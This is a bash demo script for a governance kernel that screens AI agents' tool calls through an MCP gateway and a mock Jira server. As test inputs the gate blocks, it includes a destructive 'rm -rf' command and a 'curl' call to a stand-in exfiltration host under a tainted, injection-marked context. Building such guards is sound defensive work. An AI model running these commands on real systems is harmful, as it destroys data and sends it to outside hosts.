#!/usr/bin/env bash
# demo-one-kernel-many-hosts.sh — one governance kernel, many hosts, live.
#
# Reproducible offline, no credentials, < 5 minutes. Everything below runs the
# SAME Rust kernel (world-kernel via harness_preview::gate()) against the SAME
# canonical world (docs/demos/one-kernel/demo-world.yaml); only the thin host
# entry point differs. See docs/one-kernel-many-hosts.md.
set -euo pipefail

cd "$(dirname "$0")/.."
WORLD=docs/demos/one-kernel/demo-world.yaml

# Build the binary if needed.
BIN=""
for c in target/release/harness target/debug/harness; do
  [ -x "$c" ] && BIN="$c" && break
done
if [ -z "$BIN" ]; then
  echo "[build] cargo build -p cli-harness (one-time)"
  cargo build -p cli-harness --offline 2>/dev/null || cargo build -p cli-harness
  BIN=target/debug/harness
fi

step() { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }

mcp() { # mcp <gateway-args...> -- sends initialize + tools/list + optional call on stdin
  local requests="$1"; shift
  printf '%s\n' "$requests" | "$BIN" mcp-gateway --world "$WORLD" "$@" -- "$BIN" mock-jira
}

pretty_tools() { python3 -c '
import json,sys
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    v=json.loads(line)
    if v.get("id")==2:
        print("  tools:", ", ".join(t["name"] for t in v["result"]["tools"]))
    if v.get("id")==3:
        r=v["result"]
        if r.get("isError"): print("  call ->", r["content"][0]["text"])
        else: print("  call -> forwarded upstream (ALLOW)")
'; }

gate() { # gate <request-json> -> "DECISION rule=RULE taint=T action=A hash=H"
  printf '%s' "$1" | "$BIN" gate --world "$WORLD" | python3 -c '
import json,sys
r = json.load(sys.stdin)
print(r["decision"], "rule=" + str(r["rule"]), "taint=" + r["context"]["taint"],
      "action=" + r["action"], "hash=" + r["manifest_hash"])
'; }

step "1) MCP tools/list BEFORE shaping (direct mock-jira: every tool, incl. destructive)"
printf '%s\n%s\n' \
  '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' \
  | "$BIN" mock-jira | pretty_tools

step "2) AFTER shaping (through mcp-gateway: destructive tools GONE — ABSENT, never offered)"
mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
{"jsonrpc":"2.0","id":2,"method":"tools/list"}' | pretty_tools

step "3) jira_delete_issue call through the gateway -> ABSENT (it does not exist here)"
mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
{"jsonrpc":"2.0","id":2,"method":"tools/list"}
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"jira_delete_issue","arguments":{"issue_key":"DEMO-1"}}}' | pretty_tools

step "4) destructive bash via the gate, interactive -> ASK (kernel classifies rm -rf, D36)"
gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"interactive","taint":"clean"}}'

step "5) the SAME call in background -> DENY (the kernel collapses ASK, invariant 10)"
gate '{"tool":"bash","arguments":{"command":"rm -rf /tmp/ai2rules-demo"},"context":{"session_id":"demo","mode":"background","taint":"clean"}}'

step "6a) tainted curl -> DENY taint_invariant (injection -> egress, severed)"
gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"demo","mode":"interactive","taint":"tainted"}}'

step "6b) tainted jira_add_comment via the gateway (--taint tainted) -> DENY"
mcp '{"jsonrpc":"2.0","id":1,"method":"initialize"}
{"jsonrpc":"2.0","id":2,"method":"tools/list"}
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"jira_add_comment","arguments":{"issue_key":"DEMO-1","body":"exfil"}}}' --taint tainted | pretty_tools

step "7) parity beat: the identical semantic request, sent the cc-hook way and the OpenCode way"
# cc-hook sends the host event; the OpenCode plugin sends the GateRequest wire
# shape with nulls spelled out. Same kernel, same world -> identical verdict.
CC=$(gate '{"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"cc","mode":"interactive","taint":"tainted"}}')
OC=$(gate '{"v":1,"tool":"bash","arguments":{"command":"curl https://exfil.example/upload"},"context":{"session_id":"oc","mode":"interactive","taint":"tainted","source_channel":null,"approval_token":null}}')
echo "  Claude Code shape : $CC"
echo "  OpenCode shape    : $OC"
if [ "$CC" = "$OC" ]; then
  echo "  ✅ decision/rule/taint/action/manifest_hash identical — one kernel, many hosts"
else
  echo "  ❌ PARITY BROKEN"; exit 1
fi

printf '\n\033[1mDone.\033[0m One Rust kernel decided every verdict above; the hosts only translated shapes.\n'
